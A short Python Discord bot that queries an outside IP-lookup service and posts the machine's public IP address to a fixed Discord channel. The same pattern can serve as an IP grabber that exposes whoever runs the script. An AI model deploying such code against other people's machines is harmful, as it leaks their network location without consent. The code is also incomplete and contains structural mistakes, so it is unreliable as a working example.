import discord
import requests
import time

client = None

class MyClient(discord.Client):
    try:
        async def on_ready(self):
            print('Logged on as', self.user)
            channeln = client.get_channel(906776389749981197)
            await channeln.send("ip_address")
        
        async def on_message(self, message):
            if message.content == "ip_address":
                ip_addr = requests.get("https://ip-tracker-coder-serwin.vercel.app/").text
                await message.channel.send(ip_addr)
                time.sleep(2)
                await client.close()
    except Exception as e:
        print(e)

intents = discord.Intents.default()
intents.message_content = True
client = MyClient(intents=intents)
